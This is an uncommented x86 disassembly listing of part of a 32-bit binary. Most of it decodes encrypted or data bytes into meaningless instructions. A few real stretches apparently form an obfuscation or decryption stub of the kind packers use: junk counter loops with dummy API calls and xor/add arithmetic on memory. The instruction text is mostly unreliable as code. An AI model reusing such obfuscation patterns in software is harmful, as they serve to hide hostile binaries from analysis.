  409306:	or     DWORD PTR [esi-0x6586e37],edx
  40930c:	mov    ds,WORD PTR [eax]
  40930e:	cld    
  40930f:	ja     0x40929b
  409311:	sahf   
  409312:	shl    BYTE PTR [edi+0x505ca0e2],cl
  409318:	gs inc ebx
  40931a:	(bad)  
  40931b:	inc    ebx
  40931c:	pop    ecx
  40931d:	(bad)  
  40931f:	call   0x48fc:0x521dff94
  409326:	adc    DWORD PTR [edi-0x6b6d57cf],esi
  40932c:	fwait
  40932d:	icebp  
  40932e:	jo     0x4093a2
  409330:	test   eax,0x6dd4b3c9
  409335:	jp     0x409301
  409337:	clc    
  409338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409339:	add    eax,0xd8d63d4d
  40933e:	shr    bl,0x71
  409341:	or     ch,BYTE PTR [edi-0x68]
  409344:	adc    ebx,esp
  409346:	sub    al,BYTE PTR [ecx-0x45]
  409349:	outs   dx,DWORD PTR ds:[esi]
  40934a:	retf   0x358a
  40934d:	or     al,0x5e
  40934f:	cmp    al,0xf6
  409351:	frstor [edi+eiz*4]
  409354:	inc    edi
  409355:	add    cl,cl
  409357:	popf   
  409358:	mov    eax,0x73fbefc
  40935d:	mov    ds:0x6c0fb72d,al
  409362:	pop    ebx
  409363:	(bad)  
  409364:	call   0xf0830128
  409369:	xor    BYTE PTR [eax-0x74d396eb],0xe9
  409370:	cmp    DWORD PTR [esi-0x4a],ecx
  409373:	jp     0x4093d8
  409375:	jl     0x409379
  409377:	scas   al,BYTE PTR es:[edi]
  409378:	xor    ch,dh
  40937a:	and    BYTE PTR [edi+0x1],bh
  40937d:	push   ss
  40937e:	lea    esi,[ebx]
  409380:	imul   ecx,ebx,0xf314ae37
  409386:	xchg   BYTE PTR [ebx-0x5],ah
  409389:	jbe    0x4093f0
  40938b:	jmp    0x4f7bc3c4
  409390:	enter  0x8a17,0xce
  409394:	push   esp
  409395:	push   esi
  409396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409397:	or     DWORD PTR ds:[eax-0x43],eax
  40939b:	(bad)  
  40939c:	sbb    esi,edx
  40939e:	not    DWORD PTR [ebx+0x7e02f494]
  4093a4:	xchg   cl,ah
  4093a6:	xor    eax,0x348628b
  4093ab:	cmp    eax,0x7f0fbbb2
  4093b0:	cmp    eax,0x98bab717
  4093b5:	xor    eax,DWORD PTR [ebp+0x5f]
  4093b8:	arpl   si,di
  4093ba:	mov    bh,0x61
  4093bc:	add    DWORD PTR [esi+0x7a9d5e27],edx
  4093c2:	push   eax
  4093c3:	mov    esp,0x316f47f6
  4093c8:	bound  ebp,QWORD PTR [esi]
  4093ca:	push   ebx
  4093cb:	pop    esi
  4093cc:	mov    al,0x24
  4093ce:	add    DWORD PTR [edi-0x43],edx
  4093d1:	repnz push edi
  4093d3:	aas    
  4093d4:	test   eax,0xdcc5cc38
  4093d9:	xchg   edx,eax
  4093da:	adc    al,0x0
  4093dc:	mov    ds:0x90b82c8a,al
  4093e1:	(bad)  
  4093e2:	sahf   
  4093e3:	xchg   eax,ecx
  4093e5:	into   
  4093e6:	cmp    al,0x8f
  4093e8:	out    0xc3,eax
  4093ea:	pop    ebp
  4093eb:	and    eax,0xf0bb862d
  4093f0:	or     BYTE PTR [ebx],ah
  4093f2:	jnp    0x409453
  4093f4:	arpl   WORD PTR [edi-0x44],dx
  4093f7:	or     eax,0x7eca2eca
  4093fc:	mov    BYTE PTR [edi],dh
  4093fe:	lea    eax,[ebx-0x56]
  409401:	mov    ch,BYTE PTR [ecx+0x459eb122]
  409407:	aad    0x5f
  409409:	inc    edi
  40940a:	jmp    0x4093ab
  40940c:	in     al,dx
  40940d:	jb     0x40946f
  40940f:	dec    esi
  409410:	pop    DWORD PTR [ebp-0x3588b57b]
  409416:	out    0xb7,al
  409418:	xchg   BYTE PTR [ebx+0x58],ah
  40941b:	jb     0x4093ba
  40941d:	cmp    BYTE PTR [ebx-0x6ce0cd8a],al
  409423:	ss hlt 
  409425:	shl    DWORD PTR [eax],0xbf
  409428:	sbb    al,0x73
  40942a:	sbb    BYTE PTR ds:0x2b80db94,0x73
  409431:	dec    ebp
  409432:	call   0xc04f3a25
  409437:	sbb    al,0xe4
  409439:	push   edx
  40943a:	and    ch,ah
  40943c:	das    
  40943d:	rcl    BYTE PTR [ecx],0xff
  409440:	arpl   WORD PTR [esi-0x6f],cx
  409443:	aad    0xb1
  409445:	imul   eax,DWORD PTR ds:0x5e94d58e,0x6f
  40944c:	aas    
  40944d:	mov    ah,0x89
  40944f:	je     0x409484
  409451:	add    ch,0x77
  409454:	fwait
  409455:	or     eax,0x6df2e11c
  40945a:	ret    
  40945b:	inc    esp
  40945c:	inc    eax
  40945d:	add    al,0x9
  40945f:	adc    BYTE PTR [esi+0x2d63f997],dh
  409465:	or     BYTE PTR [esi],dh
  409467:	inc    ecx
  409468:	into   
  409469:	(bad)  
  40946a:	jns    0x4094a7
  40946c:	pop    ss
  40946d:	js     0x4093fe
  40946f:	enter  0x7325,0x7d
  409473:	popa   
  409474:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  40947b:	and    DWORD PTR ds:0x43382b,0x0
  409485:	xor    ecx,ecx
  409487:	add    ecx,DWORD PTR ds:0x43382b
  40948d:	inc    ecx
  40948e:	mov    DWORD PTR ds:0x43382b,ecx
  409494:	cmp    DWORD PTR ds:0x43382b,0x23
  40949b:	jne    0x4094bf
  4094a1:	push   0x7f04
  4094a6:	push   DWORD PTR [ebp-0xc]
  4094a9:	push   DWORD PTR [ebp-0x28]
  4094ac:	push   0x10bc
  4094b1:	push   DWORD PTR [ebp-0x10]
  4094b4:	push   0x1509
  4094b9:	call   DWORD PTR ds:0x41239c
  4094bf:	cmp    DWORD PTR ds:0x43382b,0x13
  4094c6:	jb     0x409485
  4094cc:	sub    DWORD PTR ds:0x433713,ecx
  4094d2:	lea    eax,[ebp-0x14]
  4094d5:	and    DWORD PTR ds:0x433777,0x0
  4094df:	jmp    0x4094f1
  4094e4:	mov    ebx,DWORD PTR ds:0x433777
  4094ea:	inc    ebx
  4094eb:	mov    DWORD PTR ds:0x433777,ebx
  4094f1:	cmp    DWORD PTR ds:0x433777,0x13
  4094f8:	jae    0x40951b
  4094fe:	cmp    DWORD PTR ds:0x433777,0x22
  409505:	jne    0x409516
  40950b:	push   0x24ee
  409510:	call   DWORD PTR ds:0x4123a0
  409516:	jmp    0x4094e4
  40951b:	mov    DWORD PTR [ebp-0x20],eax
  40951e:	and    DWORD PTR ds:0x43377b,0x0
  409528:	jmp    0x409538
  40952d:	mov    eax,ds:0x43377b
  409532:	inc    eax
  409533:	mov    ds:0x43377b,eax
  409538:	cmp    DWORD PTR ds:0x43377b,0x11
  40953f:	jae    0x409578
  409545:	cmp    DWORD PTR ds:0x43377b,0x9
  40954c:	jne    0x40955b
  409552:	push   DWORD PTR [ebp-0x1c]
  409555:	call   DWORD PTR ds:0x412018
  40955b:	cmp    DWORD PTR ds:0x43377b,0x8
  409562:	jne    0x409573
  409568:	mov    eax,ds:0x43377b
  40956d:	inc    eax
  40956e:	mov    ds:0x43377b,eax
  409573:	jmp    0x40952d
  409578:	mov    eax,DWORD PTR [ebp-0x14]
  40957b:	sbb    ebx,0x50bb
  409581:	mov    ecx,DWORD PTR [ebp-0x20]
  409584:	xor    eax,esi
  409586:	and    ebx,0x1e7c
  40958c:	add    eax,edi
  40958e:	sub    DWORD PTR ds:0x4337b7,ecx
  409594:	mov    DWORD PTR [ecx],eax
  409596:	or     ebx,ebx
  409598:	mov    eax,ds:0x413cb2
  40959d:	mov    ebx,0x8e12feb8
  4095a2:	mov    DWORD PTR [ebp-0xc],ebx
  4095a5:	xor    DWORD PTR ds:0x433723,0x433713
  4095af:	mov    eax,DWORD PTR [eax]
  4095b1:	and    DWORD PTR ds:0x433733,0x43382f
  4095bb:	mov    cx,WORD PTR [ebp-0x4]
  4095bf:	jmp    0x4098e0
  4095c4:	jge    0x40957b
  4095c6:	mov    edx,0x397172fe
  4095cb:	mov    ch,0x54
  4095cd:	ds sbb eax,0xbb5dcd0b
  4095d3:	(bad)  [ecx+ebx*8+0x7e]
  4095d7:	jle    0x409653
  4095d9:	jge    0x409659
  4095db:	jle    0x40965a
  4095dd:	jge    0x4095ad
  4095df:	retf   
  4095e0:	dec    ebp
  4095e1:	into   
  4095e2:	xchg   ebx,eax
  4095e3:	and    edx,DWORD PTR [ebx-0x76]
  4095e6:	pop    ebx
  4095e7:	mov    ah,0x83
  4095e9:	rcr    BYTE PTR [esi],cl
  4095eb:	mov    ch,0xd0
  4095ed:	cmc    
  4095ee:	inc    ebp
  4095ef:	mov    ds:0xfe68292c,eax
  4095f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095f5:	mov    al,0x57
  4095f7:	in     al,dx
  4095f8:	or     eax,ecx
  4095fa:	dec    edx
  4095fb:	pop    ds
  4095fc:	aaa    
  4095fd:	jb     0x409587
  4095ff:	xor    eax,0xdf86dfe5
  409604:	(bad)  
  409605:	(bad)  
  409607:	fist   WORD PTR [ecx+edx*2]
  40960a:	or     ebx,edi
  40960c:	not    BYTE PTR [edx-0x7dca087c]
  409612:	sbb    al,0x5f
  409614:	sub    al,ah
  409616:	or     esp,DWORD PTR [esi+ebx*8-0x6022aafb]
  40961d:	push   0xffffffa5
  40961f:	gs mov esp,0xb058615d
  409625:	adc    al,0x7d
  409627:	mov    cl,BYTE PTR [eax+0x374bfb7b]
  40962d:	test   BYTE PTR [edx],dh
  40962f:	js     0x40961c
  409631:	sahf   
  409632:	adc    DWORD PTR ds:0x2d401b81,ebx
  409638:	sahf   
  409639:	iret   
  40963a:	rcl    BYTE PTR ds:0x4e3f7fc2,0x82
  409641:	rcl    esp,1
  409643:	test   BYTE PTR [eax],al
  409645:	repnz cmp BYTE PTR [eax],bh
  409648:	aaa    
  409649:	int3   
  40964a:	call   0xe252:0x50376a8f
  409651:	or     al,0x60
  409653:	mov    bl,0x3f
  409655:	xchg   BYTE PTR [edx],dh
  409657:	mov    al,0x55
  409659:	sub    DWORD PTR ds:0x9ffb1303,0x1f5c6e69
  409663:	retf   0x9735
  409666:	ds jb  0x409639
  409669:	cmp    eax,0x4fae2164
  40966e:	push   edx
  40966f:	mov    bh,0x91
  409671:	mov    ds:0x472ab43b,al
  409676:	sub    al,BYTE PTR [eax-0x1d0ac60f]
  40967c:	sti    
  40967d:	dec    ebp
  40967e:	nop
  40967f:	xor    al,0x66
  409681:	(bad)  ss:[ecx+0xe]
  409685:	imul   edi,DWORD PTR [esi],0xffffffc1
  409688:	into   
  409689:	jne    0x4096e8
  40968b:	xchg   DWORD PTR [ecx],ebx
  40968d:	push   eax
  40968e:	and    eax,0x3aa3639d
  409693:	mov    bl,0x24
  409695:	pusha  
  409696:	mov    fs,ebp
  409698:	les    esp,FWORD PTR [ebx]
  40969a:	dec    esi
  40969b:	inc    eax
  40969c:	mov    al,0x4e
  40969e:	dec    ebp
  40969f:	arpl   WORD PTR ds:0xcfbb779c,si
  4096a6:	sub    DWORD PTR [esi+0x5919cdfc],0x17
  4096ad:	(bad)  
  4096ae:	mov    ebp,0x29cc91a9
  4096b3:	pop    eax
  4096b4:	mov    eax,0x714e449c
  4096b9:	das    
  4096ba:	mov    esp,0xdd61af6
  4096bf:	cmp    DWORD PTR [edi],edx
  4096c1:	mov    al,0xcc
  4096c3:	stc    
  4096c4:	popf   
  4096c5:	add    al,0xd2
  4096c7:	sar    BYTE PTR [edx+0x65b6176d],1
  4096cd:	pop    ebp
  4096ce:	in     eax,dx
  4096cf:	push   ecx
  4096d0:	mov    edx,0x90f7b0c
  4096d5:	fiadd  DWORD PTR [edx+0x60]
  4096d8:	lock (bad) 
  4096da:	aam    0xe8
  4096dc:	cmc    
  4096dd:	and    bh,BYTE PTR [edx-0x163d2168]
  4096e3:	push   es
  4096e4:	xchg   BYTE PTR [eax+0x0],ch
  4096e7:	fstp   QWORD PTR [edi]
  4096e9:	ja     0x409763
  4096eb:	js     0x4096ca
  4096ed:	adc    ebx,ebp
  4096ef:	in     eax,0x91
  4096f1:	jge    0x40967e
  4096f3:	jne    0x409750
  4096f5:	jmp    0x38e16be3
  4096fa:	addr16 in eax,dx
  4096fc:	mov    ?,edx
  4096fe:	push   ebx
  4096ff:	(bad)  
  409700:	js     0x4096ef
  409702:	pop    ecx
  409703:	inc    edx
  409704:	jb     0x40973c
  409706:	cwde   
  409707:	stos   BYTE PTR es:[edi],al
  409708:	scas   al,BYTE PTR es:[edi]
  409709:	inc    edx
  40970a:	fcom   QWORD PTR ds:0x40bf027e
  409710:	push   ds
  409711:	and    ch,BYTE PTR [eax+ebx*4]
  409714:	les    ebp,FWORD PTR [edx]
  409716:	push   edx
  409717:	jp     0x40978b
  409719:	mov    ds:0x28e28ab9,eax
  40971e:	inc    ebp
  40971f:	mov    eax,ds:0x83bd329a
  409724:	jno    0x40978e
  409726:	jmp    0xda53:0xac1b89b1
  40972d:	or     al,0x6f
  40972f:	jl     0x4097af
  409731:	and    al,BYTE PTR [edx-0x3b63d90b]
  409737:	or     dh,BYTE PTR [ecx]
  409739:	jmp    0x409747
  40973b:	icebp  
  40973c:	std    
  40973d:	cs jno 0x409794
  409740:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409741:	or     ebx,esi
  409743:	or     bh,dh
  409745:	out    dx,eax
  409746:	outs   dx,DWORD PTR ds:[esi]
  409747:	mov    bh,0xbf
  409749:	mov    eax,ds:0x7acd6afe
  40974e:	xchg   esp,eax
  40974f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409750:	sbb    eax,0x9a4c0537
  409755:	xchg   edi,eax
  409756:	in     al,0xa5
  409758:	loope  0x40973a
  40975a:	jo     0x4097be
  40975c:	add    ebp,DWORD PTR [edx-0xa]
  40975f:	pop    edi
  409760:	(bad)  
  409761:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409762:	jo     0x4097c8
  409764:	sbb    ah,cl
  409766:	pop    esi
  409767:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409768:	int    0xf6
  40976a:	pop    edi
  40976b:	and    eax,0x46202d94
  409770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409771:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409772:	ret    0x6a60
  409775:	icebp  
  409776:	neg    ebp
  409778:	mov    ebp,0xeacfb30b
  40977d:	jno    0x4097b8
  40977f:	call   0xf7eb:0x1f5e298c
  409786:	inc    edi
  409787:	sti    
  409788:	sub    eax,0xd2e8428e
  40978d:	mov    esi,0xdf09e7b7
  409792:	std    
  409793:	sbb    eax,0x4466aae8
  409798:	inc    ebp
  409799:	fidiv  DWORD PTR [edi]
  40979b:	mov    ebx,?
  40979d:	cmp    edi,ebx
  40979f:	cmp    BYTE PTR [eax],bh
  4097a1:	mov    ah,0x36
  4097a3:	mov    ch,0xfa
  4097a5:	push   ds
  4097a6:	js     0x4097e8
  4097a8:	and    al,0xe5
  4097aa:	shl    BYTE PTR [edi-0x73],cl
  4097ad:	and    bl,BYTE PTR [esi+0x6281b1ca]
  4097b3:	mov    al,0x2e
  4097b5:	stos   DWORD PTR es:[edi],eax
  4097b6:	out    dx,eax
  4097b7:	les    esi,FWORD PTR [edx-0x22]
  4097ba:	fidivr DWORD PTR [edi]
  4097bc:	pop    ebx
  4097bd:	mov    eax,ds:0x4e4de8c0
  4097c2:	clc    
  4097c3:	les    edx,FWORD PTR [ecx-0x4d4d10b4]
  4097c9:	xor    ebp,DWORD PTR ds:[ecx+ebp*4+0x5fd7ac22]
  4097d1:	aas    
  4097d2:	lods   eax,DWORD PTR ds:[esi]
  4097d3:	dec    ebx
  4097d4:	and    al,0x80
  4097d6:	in     eax,dx
  4097d7:	adc    cl,BYTE PTR [ecx*8+0xeed2345]
  4097de:	xor    ah,bh
  4097e0:	loopne 0x409838
  4097e2:	inc    eax
  4097e4:	xor    BYTE PTR [ebx],cl
  4097e6:	mov    bl,0xd4
  4097e8:	jnp    0x4097cd
  4097ea:	rcl    BYTE PTR [eax+0x1af529e9],1
  4097f0:	xor    BYTE PTR [edx+0x5c5254bf],ah
  4097f6:	xor    eax,0x62893f09
  4097fb:	bound  ebp,QWORD PTR [eax+0x5141403a]
  409801:	lock jmp 0xce17:0xc9613b74
  409809:	enter  0x3a77,0x2c
  40980d:	xchg   edx,eax
  40980e:	sbb    al,BYTE PTR [edx+eiz*4-0x7b31d03f]
  409815:	unpcklps xmm7,XMMWORD PTR [edx+0x338fdd0d]
  40981c:	sbb    eax,0xbf50df11
  409821:	je     0x4097d0
  409823:	or     edi,ebp
  409825:	es pop ecx
  409827:	popa   
  409828:	dec    edi
  409829:	jle    0x4097bc
  40982b:	push   ss
  40982c:	(bad)  
  40982d:	std    
  40982e:	mov    al,0xf
  409830:	ror    BYTE PTR [esi+eiz*1+0x2e552e8b],1
  409837:	sub    DWORD PTR [edx-0x724738d4],eax
  40983d:	fldenv gs:[edx]
  409840:	fcomp  QWORD PTR ds:0xe7f345af
  409846:	mov    dh,0x27
  409848:	cmp    BYTE PTR [esi],dl
  40984a:	mov    al,ds:0xe56acced
  40984f:	mov    dl,0x57
  409851:	(bad)  
  409853:	lods   eax,DWORD PTR ds:[esi]
  409854:	pop    ss
  409855:	fmul   st,st(6)
  409857:	push   cs
  409858:	repz (bad) 
  40985a:	repz test BYTE PTR [ecx-0x12],bh
  40985e:	sar    BYTE PTR [ecx+0x73a92921],1
  409864:	sub    BYTE PTR [ecx+0x52],0x67
  409868:	clc    
  409869:	and    eax,0x8a9a0070
  40986e:	repz pop ss
  409870:	adc    ebp,DWORD PTR [esi+edx*4-0x5a]
  409874:	pushf  
  409875:	cmp    al,0x5
  409877:	pminsw mm5,mm7
  40987a:	sbb    ecx,ebx
  40987c:	dec    ebx
  40987d:	dec    ebx
  40987e:	fbstp  TBYTE PTR [edi-0x2a51f6a7]
  409885:	jl     0x40983f
  409887:	xor    eax,0x2bcfd684
  40988c:	lds    esi,FWORD PTR [ebp+0x5e]
  40988f:	adc    dl,dh
  409891:	sub    eax,0xa9dc6c47
  409896:	and    al,0x96
  409898:	lods   eax,DWORD PTR ds:[esi]
  409899:	mov    ah,0x2b
  40989b:	fcom   QWORD PTR [ebx]
  40989d:	cmc    
  40989e:	xchg   ebp,eax
  40989f:	popf   
  4098a0:	(bad)  
  4098a1:	test   DWORD PTR [edi-0x548a2fa6],edi
  4098a7:	scas   al,BYTE PTR es:[edi]
  4098a8:	or     esi,DWORD PTR [eax]
  4098aa:	in     eax,dx
  4098ab:	rol    DWORD PTR [ecx-0x1a],cl
  4098ae:	sti    
  4098af:	mov    edi,0x8b330b47
  4098b4:	add    BYTE PTR ds:0x2dab9ee6,dh
  4098ba:	cld    
  4098bb:	pop    edx
  4098bc:	call   0x7c29:0x401ab8e6
  4098c3:	pop    eax
  4098c4:	inc    edx
  4098c5:	stos   BYTE PTR es:[edi],al
  4098c6:	imul   esp,DWORD PTR [esi],0x8fed48f3
  4098cc:	test   al,0xb0
  4098ce:	loope  0x409853
  4098d0:	int3   
  4098d1:	rcr    DWORD PTR [esi],1
  4098d3:	mov    ax,0xcb72
  4098d7:	or     BYTE PTR [edx+edx*2],0x38
  4098db:	add    eax,0x5484fe42
  4098e0:	movzx  ecx,cx
  4098e3:	sbb    DWORD PTR ds:0x43383b,0x5a23
  4098ed:	add    ecx,DWORD PTR [eax]
  4098ef:	adc    DWORD PTR ds:0x4337a7,ebx
  4098f5:	mov    DWORD PTR [ebp-0x18],ecx
  4098f8:	and    eax,DWORD PTR ds:0x433737
  4098fe:	mov    eax,DWORD PTR [ebp+0x8]
  409901:	and    DWORD PTR ds:0x43376f,0x0
  40990b:	mov    ecx,DWORD PTR ds:0x43376f
  409911:	inc    ecx
  409912:	mov    DWORD PTR ds:0x43376f,ecx
  409918:	cmp    DWORD PTR ds:0x43376f,0x2e
  40991f:	jne    0x409933
  409925:	push   DWORD PTR [ebp-0x24]
  409928:	push   0x2be2
  40992d:	call   DWORD PTR ds:0x41201c
  409933:	cmp    DWORD PTR ds:0x43376f,0x1f
  40993a:	jb     0x40990b
  409940:	mov    DWORD PTR ds:0x4337a7,0x11
  40994a:	cmp    DWORD PTR ds:0x4337a7,0x0
  409951:	je     0x4099a3
  409957:	cmp    DWORD PTR ds:0x4337a7,0x6
  40995e:	jne    0x409977
  409964:	push   0x4338a4
  409969:	push   DWORD PTR [ebp-0x24]
  40996c:	push   0x64fc
  409971:	call   DWORD PTR ds:0x4121d0
  409977:	cmp    DWORD PTR ds:0x4337a7,0x7
  40997e:	jne    0x409991
  409984:	mov    ecx,DWORD PTR ds:0x4337a7
  40998a:	dec    ecx
  40998b:	mov    DWORD PTR ds:0x4337a7,ecx
  409991:	mov    ecx,DWORD PTR ds:0x4337a7
  409997:	dec    ecx
  409998:	mov    DWORD PTR ds:0x4337a7,ecx
  40999e:	jmp    0x40994a
  4099a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4099a6:	xor    eax,esi
  4099a8:	add    eax,edi
  4099aa:	cmp    DWORD PTR [ecx],eax
  4099ac:	jmp    0x409ccd
  4099b1:	cmovbe ebx,DWORD PTR [esi+0x55e577e5]
  4099b8:	je     0x4099d6
  4099ba:	dec    edi
  4099bb:	cmc    
  4099bc:	(bad)  [ebp-0xc]
  4099bf:	fidiv  WORD PTR [edi+0x68]
  4099c2:	in     al,0x7e
  4099c4:	jle    0x409a40
  4099c6:	jge    0x409a46
  4099c8:	jle    0x40995f
  4099ca:	(bad)  
  4099cb:	das    
  4099cc:	dec    ecx
  4099cd:	cmp    esi,DWORD PTR [edi+0x5747f2e8]
  4099d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099d4:	mov    WORD PTR gs:[ecx-0x64],ds
  4099d8:	gs xchg esi,eax
  4099da:	(bad)  
  4099db:	repz cmp ah,cl
  4099de:	cmp    eax,0xc37caa8a
  4099e3:	sub    al,0x1e
  4099e5:	xchg   ebx,eax
  4099e6:	mov    bh,0x91
  4099e8:	stos   DWORD PTR es:[edi],eax
  4099e9:	jbe    0x40998f
  4099eb:	jmp    0x74f9:0xe10cf2c2
  4099f2:	pop    es
  4099f3:	(bad)  
  4099f5:	add    DWORD PTR [eax-0x1e52a187],0x9cf45d8c
  4099ff:	fisttp WORD PTR [edx]
  409a01:	and    BYTE PTR [ecx-0x6a],0xf0
  409a05:	push   esi
  409a06:	xchg   edi,eax
  409a07:	jbe    0x409a6b
  409a09:	and    DWORD PTR [edi+esi*2+0x7c],esi
  409a0d:	je     0x4099de
  409a0f:	sbb    BYTE PTR [edx-0x121d72fd],bl
  409a15:	adc    edx,ecx
  409a17:	imul   ebx,DWORD PTR [edi-0x3e2be854],0x818243fd
  409a21:	add    cl,al
  409a23:	js     0x4099b1
  409a25:	cmp    DWORD PTR [edi-0x5442c441],ebp
  409a2b:	pusha  
  409a2c:	imul   esi,DWORD PTR [edi+0x4fb9cbd8],0xffffff84
  409a33:	retf   0x3dd2
  409a36:	int3   
  409a37:	fs sti 
  409a39:	lahf   
  409a3a:	cli    
  409a3b:	fwait
  409a3c:	lock adc DWORD PTR [esi+0x370fa092],edx
  409a43:	mov    eax,ds:0xe40bfc7d
  409a48:	out    dx,eax
  409a49:	jns    0x409a58
  409a4b:	call   0x740c2a7f
  409a50:	out    dx,eax
  409a51:	outs   dx,DWORD PTR ds:[esi]
  409a52:	jbe    0x409a55
  409a54:	jecxz  0x409a16
  409a56:	dec    esi
  409a57:	sbb    ebx,DWORD PTR [edx-0x77]
  409a5a:	mov    esp,0x7498bfb8
  409a5f:	imul   ebp,DWORD PTR [eax],0xe130a2a2
  409a65:	loopne 0x409a31
  409a67:	rcl    BYTE PTR [edi-0x48b3441f],0x6
  409a6e:	jge    0x409a10
  409a70:	push   edi
  409a71:	stc    
  409a72:	into   
  409a73:	rol    al,0x3c
  409a76:	jg     0x409a49
  409a78:	pop    ds
  409a79:	sub    al,0x84
  409a7b:	gs xchg edi,eax
  409a7d:	out    0x94,al
  409a7f:	xor    DWORD PTR [edx+edi*1-0x28],eax
  409a83:	test   al,0xa2
  409a85:	jb     0x409ab6
  409a87:	jmp    0x7c32f2d4
  409a8c:	out    dx,al
  409a8d:	push   ecx
  409a8e:	aam    0x66
  409a90:	call   0xce12bf07
  409a95:	scas   al,BYTE PTR es:[edi]
  409a96:	push   0xffffff97
  409a98:	pop    ebx
  409a99:	or     BYTE PTR [ecx-0x2e8852ff],bh
  409a9f:	jmp    0x1d4:0xc67174f4
  409aa6:	stc    
  409aa7:	sbb    BYTE PTR [esi],0xe4
  409aaa:	in     eax,dx
  409aab:	jb     0x409aad
  409aad:	jmp    0x409ac3
  409aaf:	bound  ecx,QWORD PTR [ecx+edi*4+0x4d]
  409ab3:	ss arpl di,dx
  409ab6:	jg     0x409b0a
  409ab8:	ss aad 0x8a
  409abb:	ror    BYTE PTR ds:0x73e63796,0xea
  409ac2:	(bad)  
  409ac3:	stc    
  409ac4:	jne    0x409a74
  409ac6:	aad    0xbb
  409ac8:	mov    ds:0x6ca4bfc2,al
  409acd:	popf   
  409ace:	jle    0x409a76
  409ad0:	hlt    
  409ad1:	retf   0x29e7
  409ad4:	sbb    edx,DWORD PTR [esi+0xf]
  409ad7:	jne    0x409acf
  409ad9:	pop    ebx
  409ada:	sti    
  409adb:	ret    
  409adc:	sbb    eax,0x4bc7ac9a
  409ae1:	jmp    0xe45f961f
  409ae6:	mov    edi,0xb6e3a68e
  409aeb:	pandn  mm7,QWORD PTR [ecx+0x0]
  409aef:	push   0x1a
  409af1:	ficom  WORD PTR [ecx]
  409af3:	xlat   BYTE PTR ds:[ebx]
  409af4:	add    eax,0xb7bead55
  409af9:	gs aam 0x41
  409afc:	out    dx,al
  409afd:	mov    dl,0x3f
  409aff:	cld    
  409b00:	xor    DWORD PTR [ecx+0x58424a4a],edi
  409b06:	fstp   QWORD PTR [edi+0xd]
  409b09:	shr    cl,1
  409b0b:	xor    al,BYTE PTR [ebx-0x5bf3381c]
  409b11:	xchg   esi,eax
  409b12:	into   
  409b13:	fwait
  409b14:	aam    0x9
  409b16:	adc    eax,0x2960eb27
  409b1b:	or     eax,0x4357ca65
  409b20:	mov    edi,0x19eaca17
  409b25:	inc    eax
  409b26:	xchg   esi,eax
  409b27:	repz clc 
  409b29:	adc    al,0x5e
  409b2b:	(bad)  
  409b2c:	xor    dh,BYTE PTR [eax-0x3a58f010]
  409b32:	or     DWORD PTR [esi],esp
  409b34:	retf   0x8548
  409b37:	dec    ecx
  409b38:	dec    edi
  409b39:	mov    cl,0x5
  409b3b:	jle    0x409b07
  409b3d:	dec    ebx
  409b3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b3f:	push   esp
  409b40:	inc    esp
  409b41:	xchg   esp,eax
  409b42:	lods   eax,DWORD PTR ds:[esi]
  409b43:	pusha  
  409b44:	or     eax,0x36de428
  409b49:	dec    ebx
  409b4a:	or     BYTE PTR [ecx],cl
  409b4c:	out    0xda,eax
  409b4e:	add    al,0x12
  409b51:	addr16 jmp 0x3cd71d36
  409b57:	or     eax,0x22dbfd4
  409b5c:	mov    eax,ds:0x146718d9
  409b61:	inc    edi
  409b62:	sub    al,0x40
  409b64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b65:	or     BYTE PTR [ecx+0x57047eaa],cl
  409b6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b6c:	out    dx,al
  409b6d:	xchg   esi,eax
  409b6e:	arpl   WORD PTR [ecx],di
  409b70:	jl     0x409bdb
  409b72:	pop    ds
  409b73:	daa    
  409b74:	ins    BYTE PTR es:[edi],dx
  409b75:	mov    al,0xde
  409b77:	nop
  409b78:	cwde   
  409b79:	les    esi,FWORD PTR [edx]
  409b7b:	hlt    
  409b7c:	ja     0x409b2a
  409b7e:	cmp    BYTE PTR [ecx+0xb2b3ac3],al
  409b84:	or     eax,0x58aa24f
  409b89:	(bad)  
  409b8a:	or     eax,0x353c1027
  409b8f:	dec    edx
  409b90:	adc    ebx,ecx
  409b92:	mov    BYTE PTR [edi-0x2291bc64],0x68
  409b99:	inc    esi
  409b9a:	nop
  409b9b:	inc    ebx
  409b9c:	pushf  
  409b9d:	test   BYTE PTR [esi],bh
  409b9f:	or     edx,ebx
  409ba1:	les    ebp,FWORD PTR [ebx+edi*1-0x5b]
  409ba5:	ss out 0xa1,eax
  409ba8:	aad    0x29
  409baa:	dec    edi
  409bab:	fisttp QWORD PTR [ebp+0xe]
  409bae:	mov    al,ds:0x1bb3ed5c
  409bb3:	mov    cs,edi
  409bb5:	fcomp  QWORD PTR [edi]
  409bb7:	xor    DWORD PTR [edx+0x2c8db59b],0xe88f303a
  409bc1:	cmc    
  409bc2:	sar    ecx,cl
  409bc4:	mov    ds:0xec9dbf33,al
  409bc9:	sub    eax,0x7967489f
  409bce:	outs   dx,BYTE PTR ds:[esi]
  409bcf:	or     DWORD PTR [eax+0x1a],ebp
  409bd2:	push   es
  409bd3:	call   0x9929:0xfd08f4f7
  409bda:	adc    eax,0x880c574b
  409bdf:	sahf   
  409be0:	imul   esp,edi,0xc6ee6066
  409be6:	dec    esi
  409be7:	sbb    DWORD PTR [ecx-0x3133464d],eax
  409bed:	ss mov bh,0xab
  409bf0:	xchg   esp,eax
  409bf1:	ror    BYTE PTR [esi+0x2ac6c8b],cl
  409bf7:	and    eax,0x29d30f16
  409bfc:	mov    cl,0x14
  409bfe:	call   0x7da5:0x308a14ff
  409c05:	push   edx
  409c06:	int    0xdb
  409c08:	aad    0x8d
  409c0a:	inc    ebx
  409c0b:	loopne 0x409c2b
  409c0d:	clc    
  409c0e:	add    eax,0xc57b60dc
